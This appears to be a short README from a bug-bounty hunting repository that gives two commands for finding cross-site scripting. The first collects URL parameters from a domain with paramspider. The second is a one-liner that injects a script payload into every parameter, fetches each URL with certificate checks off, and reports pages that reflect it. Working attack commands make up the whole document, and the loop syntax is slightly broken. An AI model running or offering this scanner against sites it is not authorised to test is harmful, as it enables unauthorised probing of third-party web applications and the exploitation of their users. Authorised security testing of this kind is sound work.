# my-hunting-scripts

## Find and testing XSS

```bash
python3 paramspider.py -d domain.com
```

### Output file has stored on output/domain.com.txt

```bash
cat jora.com.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS HERE $host"; done
```
